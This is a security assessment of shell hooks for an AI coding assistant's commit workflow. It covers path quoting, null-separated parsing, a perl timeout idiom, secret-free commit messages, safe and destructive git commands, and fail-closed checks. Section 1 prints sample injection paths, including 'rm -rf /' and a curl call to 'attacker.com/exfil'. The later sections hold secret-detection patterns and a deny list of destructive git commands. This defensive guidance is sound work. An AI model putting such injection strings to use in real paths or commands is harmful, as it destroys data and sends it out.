[< Back to Architecture Overview](architecture.md)

# Commit Workflow Security Assessment

This document covers the security properties and threat mitigations for the
commit workflow hooks described in [commit-workflow.md](commit-workflow.md).

---

## 1. Input Validation for File Paths

### Threat: Command Injection via Crafted Paths

The PostToolUse hook receives file paths from Claude's tool output as JSON
via stdin. A malicious or confused tool response could contain a path like:

```
/tmp/foo; rm -rf /
/tmp/$(curl attacker.com/exfil)
/tmp/`id`
```

If these paths are interpolated unsafely into shell commands (e.g.,
`git add $file_path`), command injection occurs.

### Mitigations

**Always quote variables.** Every shell variable expansion that contains a
file path must be double-quoted: `"$file_path"`, never bare `$file_path`.
This prevents word splitting and glob expansion.

**Use `jq -r` for JSON parsing.** The PostToolUse hook extracts file paths
with `jq -r '.tool_input.file_path'`. This is safe because jq outputs the
raw string value without shell interpretation. The critical boundary is
between jq output and shell variable assignment -- the assignment itself
(`file_path=$(...)`) is safe because command substitution assigns the literal
output.

**Use `--` to terminate option parsing.** When passing file paths to git
commands, use `git add -- "$file_path"` to prevent paths starting with `-`
from being interpreted as flags.

**Validate paths are within the repository.** Before staging, verify each
file path resolves to a location inside the git working tree. Use
`git ls-files` or path canonicalization (as the existing report-check hook
does with `pwd -P`) to prevent path traversal attacks like
`../../etc/shadow`.

**Reject null bytes.** Paths containing `\0` are invalid on all filesystems
and indicate injection attempts. Reject any path containing null bytes before
processing.

---

## 2. Safe Filename Parsing with Null Separators

### Why `git status --porcelain -z`

Standard `git status --porcelain` separates entries with newlines, but
filenames can legally contain newlines, spaces, and special characters. This
creates ambiguity that an attacker could exploit.

`git status --porcelain -z` uses null bytes (`\0`) as separators instead.
Since null bytes cannot appear in filesystem paths, parsing is unambiguous.

### Correct Parsing Pattern

```bash
git status --porcelain -z | while IFS= read -r -d '' entry; do
    status="${entry:0:2}"
    file="${entry:3}"
    # Process file safely -- $file is a literal path, no splitting
done
```

The `-d ''` flag tells `read` to use null as the delimiter. `IFS=` prevents
whitespace trimming. Together, they guarantee correct parsing regardless of
filename content.

### Risk of Ignoring This

If standard newline-delimited output is used instead, an attacker who can
create a file named `innocent.txt\nmalicious.sh` could cause the hook to
misparse the status output and either skip security checks on malicious files
or incorrectly stage them.

---

## 3. The `exec @ARGV` Perl Timeout Pattern

The existing `nefario-report-check.sh` (line 87) contains:

```bash
timeout_cmd="perl -e 'alarm 5; exec @ARGV' --"
```

This is a common idiom for implementing command timeout on macOS where
GNU `timeout` is unavailable.

### How It Works

1. `alarm 5` sets a POSIX signal alarm: the process receives SIGALRM after
   5 seconds.
2. `exec @ARGV` replaces the perl process with the command passed as
   arguments. The `@ARGV` array contains everything after `--` on the
   command line.
3. Since `exec` replaces the process, the alarm is inherited by the new
   process. If it runs longer than 5 seconds, SIGALRM terminates it.

### Security Properties

**No shell interpretation.** `exec @ARGV` passes arguments directly to
`execvp(3)` without shell interpretation. This is safe against command
injection because the arguments are not processed by a shell -- they are
passed as a literal argument vector.

**The `--` separator is critical.** It prevents perl from interpreting
subsequent arguments as perl flags. Without it, a crafted argument starting
with `-` could be interpreted as a perl option.

**Fail-safe on timeout.** If the command exceeds the alarm duration, SIGALRM
kills it. The default SIGALRM handler terminates the process, so the hook
does not hang indefinitely. The exit code will be non-zero (128 + signal
number), which the calling code should treat as failure.

### Recommendation

This pattern is safe and well-established. Keep it as a fallback for systems
without GNU `timeout` or `gtimeout`. Consider adding `gtimeout` (from
coreutils) to the project's recommended development dependencies to reduce
reliance on the perl fallback.

---

## 4. Commit Message Safety

### Threat: Secret Leakage in Commit Messages

Commit messages are permanently stored in git history and visible in logs,
PR descriptions, and CI output. If a commit message contains file contents,
transcript excerpts, or environment variable values, secrets could leak.

### Rules

1. **Never include file contents in commit messages.** The message describes
   what changed, not what the file contains.
2. **Never include transcript snippets.** Transcripts may contain user input,
   API responses, or environment details.
3. **Never echo environment variables.** Messages like
   `"fix: update API_KEY to sk-..."` leak credentials.
4. **Keep messages structural.** Use the conventional commit format:
   `type(scope): summary`. The summary describes the action (e.g., "add
   device flow token exchange"), not data values.
5. **PR bodies are also permanent.** The same rules apply to auto-generated
   PR descriptions. Summarize the work structurally, do not paste output.

### Enforcement

Commit message generation happens in the Claude session (not in hooks), so
enforcement is via prompt instructions rather than programmatic checks.
The commit-check hook could add a basic heuristic scan (e.g., reject messages
containing patterns like `sk-`, `-----BEGIN`, or base64 blobs longer than
40 characters), but this is deferred to a future iteration to avoid false
positives.

---

## 5. Git Command Safety for Hooks

### Safe Commands (Read-Only)

These commands are safe for hooks to invoke at any time. They do not modify
the repository state:

| Command | Purpose |
|---------|---------|
| `git status --porcelain -z` | List changed files |
| `git diff --name-only` | List files with differences |
| `git diff -- <file>` | Show changes in a specific file |
| `git branch --show-current` | Get current branch name |
| `git rev-parse --is-inside-work-tree` | Check if in a git repo |
| `git ls-files` | List tracked files |
| `git log --oneline -N` | Read recent commit history |

### Staging Commands (Low Risk, Targeted)

These commands modify the index but not the working tree. They are safe when
used with explicit file paths:

| Command | Constraints |
|---------|-------------|
| `git add -- <file>` | Only with explicit paths from the ledger. Never `git add -A` or `git add .` |

### Commit Commands (Irreversible Locally)

Creating a commit is locally irreversible (it adds to history). Hooks should
only invoke `git commit` when the user has explicitly approved:

| Command | Constraints |
|---------|-------------|
| `git commit -m <message>` | Only after user approval at a commit checkpoint |

### Destructive Commands (Never in Hooks)

Hooks must never invoke these commands. They can destroy work, rewrite
history, or affect remote state:

| Command | Risk |
|---------|------|
| `git push --force` | Overwrites remote history |
| `git reset --hard` | Destroys uncommitted changes |
| `git checkout .` / `git restore .` | Destroys uncommitted changes |
| `git clean -f` | Deletes untracked files permanently |
| `git branch -D` | Deletes a branch without merge check |
| `git rebase` | Rewrites history |
| `git push` (without user approval) | Publishes code without consent |

### Branch Commands (Controlled)

Branch creation is safe but should only happen at session start with user
awareness:

| Command | Constraints |
|---------|-------------|
| `git checkout -b <name>` | Only at session start, only from main/master |
| `git push -u origin <name>` | Only at wrap-up, only with user approval |

---

## 6. Fail-Closed Behavior

Every security check in the commit workflow must fail closed: if the check
cannot determine safety, it must abort the operation rather than proceed.

### Specific Fail-Closed Requirements

**Sensitive patterns file unreadable.** If `.claude/hooks/sensitive-patterns.txt`
cannot be read (missing, permissions error, corrupt), the hook must refuse to
stage any files and warn the user. It must not fall back to "no patterns
means no filtering."

**Ledger file unreadable.** If the change ledger cannot be read, the hook
must not fall back to `git status` (which would stage unrelated changes).
It should warn and exit without staging.

**Branch detection failure.** If `git branch --show-current` fails or returns
empty (detached HEAD), the hook must not assume it is safe to commit. It
should warn about the ambiguous state.

**Path validation failure.** If a file path cannot be canonicalized or
verified as within the repository, that file must be excluded from staging
with a warning.

**Git command failure.** If any git command exits non-zero, the hook must
treat it as a failure and abort. It must not silently continue with partial
results.

### Implementation Pattern

```bash
# Fail-closed: abort on any error
set -euo pipefail

# Fail-closed: unreadable patterns file means no staging
if [[ ! -r "$PATTERNS_FILE" ]]; then
    echo "ERROR: Cannot read sensitive patterns file. Refusing to stage." >&2
    exit 1
fi
```

The `set -euo pipefail` directive is the baseline: any unhandled error
terminates the script. Individual checks add explicit guards for cases where
a silent failure (exit 0) would be the wrong default.

---

## 7. Summary of Recommendations

| Area | Recommendation | Priority |
|------|---------------|----------|
| File path quoting | Always double-quote `"$variable"` in shell commands | Critical |
| Option termination | Use `--` before file path arguments to git | Critical |
| Null-separated parsing | Use `git status --porcelain -z` with `read -d ''` | Critical |
| Fail-closed checks | Abort on unreadable patterns, unreadable ledger, branch detection failure | Critical |
| Path validation | Canonicalize and verify paths are within the repo | High |
| Commit message hygiene | Never include file contents, transcripts, or env values | High |
| Destructive commands | Never invoke force-push, reset, clean, or rebase from hooks | High |
| Perl timeout pattern | Safe as-is; consider recommending `gtimeout` as dev dependency | Low |
| High-entropy scanning | Deferred. Future: scan staged diffs for API keys and high-entropy strings | Deferred |
